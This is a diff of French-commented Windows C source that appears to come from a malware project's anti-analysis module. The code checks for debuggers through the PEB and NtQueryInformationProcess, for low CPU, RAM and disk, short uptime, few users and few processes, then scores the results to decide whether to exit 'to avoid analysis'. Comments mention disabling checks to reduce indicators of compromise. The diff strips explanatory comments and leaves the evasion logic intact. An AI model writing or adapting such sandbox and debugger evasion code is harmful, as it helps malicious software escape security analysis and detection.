@@ -96,10 +96,6 @@ BOOL CheckVirtualMachine() {
     return isVM;
 }
 
-// ============================================================================
-// DÉTECTION DE DEBUGGER
-// ============================================================================
-
 /*
  * CheckDebugger
  * -------------
@@ -119,9 +115,6 @@ BOOL CheckDebugger() {
     printf("[*] Vérification de debugger...\n");
     #endif
     
-    // ========================================================================
-    // MÉTHODE 1 : IsDebuggerPresent() - COMMENTED OUT (reduces IoCs)
-    // ========================================================================
     /*
     if (IsDebuggerPresent()) {
         #ifndef PRODUCTION
@@ -131,9 +124,6 @@ BOOL CheckDebugger() {
     }
     */
     
-    // ========================================================================
-    // MÉTHODE 2 : CheckRemoteDebuggerPresent() - COMMENTED OUT (reduces IoCs)
-    // ========================================================================
     /*
     BOOL remoteDebugger = FALSE;
     CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
@@ -145,9 +135,6 @@ BOOL CheckDebugger() {
     }
     */
     
-    // ========================================================================
-    // MÉTHODE 3 : Vérifier le PEB (Process Environment Block)
-    // ========================================================================
     // Le PEB contient un flag BeingDebugged
     
     #ifdef _WIN64
@@ -163,9 +150,6 @@ BOOL CheckDebugger() {
         isDebugged = TRUE;
     }
     
-    // ========================================================================
-    // MÉTHODE 4 : NtQueryInformationProcess
-    // ========================================================================
     typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(
         HANDLE ProcessHandle,
         DWORD ProcessInformationClass,
@@ -216,21 +200,6 @@ BOOL CheckDebugger() {
     return isDebugged;
 }
 
-// ============================================================================
-// VÉRIFICATION DES RESSOURCES SYSTÈME
-// ============================================================================
-
-/*
- * CheckSystemResources
- * --------------------
- * Vérifie si les ressources système sont cohérentes avec un système réel.
- * Les sandboxes ont souvent peu de ressources.
- * 
- * VÉRIFICATIONS :
- * - Nombre de CPUs (< 2 = suspect)
- * - RAM totale (< 4GB = suspect)
- * - Espace disque (< 80GB = suspect)
- */
 BOOL CheckSystemResources() {
     BOOL lowResources = FALSE;
     
@@ -238,9 +207,6 @@ BOOL CheckSystemResources() {
     printf("[*] Vérification des ressources système...\n");
     #endif
     
-    // ========================================================================
-    // VÉRIFIER LE NOMBRE DE CPUS
-    // ========================================================================
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo);
     
@@ -305,18 +271,6 @@ BOOL CheckSystemResources() {
     return lowResources;
 }
 
-// ============================================================================
-// VÉRIFICATION DE L'UPTIME
-// ============================================================================
-
-/*
- * CheckUptime
- * -----------
- * Vérifie depuis combien de temps le système tourne.
- * Les sandboxes redémarrent souvent (uptime faible).
- * 
- * CRITÈRE : Uptime < 10 minutes = suspect
- */
 BOOL CheckUptime() {
     #ifndef PRODUCTION
     printf("[*] Vérification de l'uptime système...\n");
@@ -346,29 +300,11 @@ BOOL CheckUptime() {
     return FALSE;
 }
 
-// ============================================================================
-// DÉTECTION D'ACTIVITÉ UTILISATEUR
-// ============================================================================
-
-/*
- * CheckUserActivity
- * -----------------
- * Vérifie s'il y a des traces d'activité utilisateur réelle.
- * Les sandboxes ont peu de fichiers/processus utilisateur.
- * 
- * VÉRIFICATIONS :
- * - Fichiers récents
- * - Historique navigateur
- * - Temps d'inactivité
- */
 BOOL CheckUserActivity() {
     #ifndef PRODUCTION
     printf("[*] Vérification de l'activité utilisateur...\n");
     #endif
     
-    // ========================================================================
-    // VÉRIFIER LES FICHIERS RÉCENTS
-    // ========================================================================
     WIN32_FIND_DATAA findData;
     HANDLE hFind = FindFirstFileA("C:\\Users\\*", &findData);
     int userCount = 0;
@@ -400,10 +336,7 @@ BOOL CheckUserActivity() {
         #endif
         return TRUE;
     }
-    
-    // ========================================================================
-    // VÉRIFIER LE TEMPS D'INACTIVITÉ
-    // ========================================================================
+
     LASTINPUTINFO lii;
     lii.cbSize = sizeof(LASTINPUTINFO);
     GetLastInputInfo(&lii);
@@ -413,26 +346,12 @@ BOOL CheckUserActivity() {
     printf("    • Temps d'inactivité : %d secondes\n", idleTime);
     #endif
     
-    // Dans une sandbox automatisée, il n'y a souvent aucune interaction
-    // Mais on ne considère pas cela comme critère principal
-    
     #ifndef PRODUCTION
     printf("    [OK] Activité utilisateur détectée\n");
     #endif
     return FALSE;
 }
 
-// ============================================================================
-// COMPTAGE DES PROCESSUS
-// ============================================================================
-
-/*
- * CheckProcessCount
- * -----------------
- * Compte le nombre de processus en cours d'exécution.
- * Les sandboxes ont généralement peu de processus (20-50).
- * Un système réel en a facilement 100+.
- */
 BOOL CheckProcessCount() {
     #ifndef PRODUCTION
     printf("[*] Comptage des processus...\n");
@@ -479,20 +398,6 @@ BOOL CheckProcessCount() {
     return FALSE;
 }
 
-// ============================================================================
-// FONCTION PRINCIPALE : VÉRIFICATION COMPLÈTE
-// ============================================================================
-
-/*
- * CheckSandboxEnvironment
- * -----------------------
- * Exécute toutes les vérifications et calcule un score de suspicion.
- * 
- * SCORE :
- * - Chaque détection positive ajoute des points
- * - Score > 30 = Probablement une sandbox
- * - Score > 50 = Certainement une sandbox
- */
 BOOL CheckSandboxEnvironment(EVASION_RESULT* result) {
     #ifndef PRODUCTION
     printf("\n");
@@ -551,10 +456,6 @@ BOOL CheckSandboxEnvironment(EVASION_RESULT* result) {
     return result->isSandbox;
 }
 
-// ============================================================================
-// AFFICHAGE DU RÉSULTAT
-// ============================================================================
-
 void PrintEvasionResult(EVASION_RESULT* result) {
     #ifndef PRODUCTION
     printf("\n");
@@ -603,10 +504,6 @@ void PrintEvasionResult(EVASION_RESULT* result) {
     printf("\n");
     #endif
 }
-
-// ============================================================================
-// DÉCISION : CONTINUER OU SORTIR ?
-// ============================================================================
 
 BOOL ShouldExit(EVASION_RESULT* result) {
     // Décider si on doit quitter pour éviter l'analyse
